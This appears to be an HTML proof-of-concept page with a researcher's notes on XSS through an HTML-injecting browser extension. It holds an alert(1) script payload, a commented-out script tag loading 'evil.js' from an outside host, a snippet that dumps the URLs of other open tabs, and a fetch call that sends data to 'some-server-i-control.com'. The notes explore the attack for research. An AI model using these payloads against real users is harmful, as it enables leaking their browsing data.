	i'm an extension that injects HTML into a page!
	<br>
	<!--<button onclick="document.body.background-color = blue">xss example</button>-->
	<script>alert(1)</script>
	<!-- <script src="alert.js"></script> -->  <!-- yeah this executes fine -->
	<!-- <script src="https://klatz.co/evil.js"></script> --> <!-- fails if no corresponding csp -->
<pre>
// opens extension html in new tab
// run me on example.com
// get ID from chrome://extensions
window.open("chrome-extension://EXTENSION_ID_GOES_HERE/inject.html")
</pre>

	<br>
	(we'll use the console to simulate XSS)
	<br>
	keep in mind: <b>we can XSS on both example.com and chrome-extension://</b>
	<br>
	however, chrome-extension is subject to the extension's CSP, and applies a reasonably-tight default one. chrome will also block blatantly-insecure CSPs like 'unsafe-inline'
	<!-- ooh actually we can't execute XSS returned in the page -->
	<!-- chrome-extension has a strict CSP -->
	<!-- you can execute js that shipped with the extension, -->
	<!-- but it seems like they endeavor to prevent the execution of dynamic JS -->
	<br>
	communicating between the frames is constrained by SOP. unless there's a vulnerable postmessage handler
	<br>
	example.com &amp; the extension don't need to talk to each other to exfil data
<!--     <p id="output" style="height: 200px; width: 400px; background-color: grey">
    </p> -->
<pre>
// dumps URLs to extension's execution context
// run me in the opened chrome-extension:// window
chrome.tabs.query({"active": false, "lastFocusedWindow": true}, function (tabs) {
	for (let tab of tabs) {
		console.log(tab.url)
	}
});
</pre>

<!-- how do these two talk to ea other? xss in example.com to the browser extension tab? -->
<!-- okay so this is constrained by SOP since they're separate frames -->

<pre>
// lastly, exfil
// modulo csp / sop / httponly on cookies
var data_to_exfil = "foo";
// make sure Access-Control-Allow-Origin: *
fetch("https://some-server-i-control.com/" + data_to_exfil)
</pre>

<!-- also i think you could probably exfil it out by getting back to the example.com tab? -->
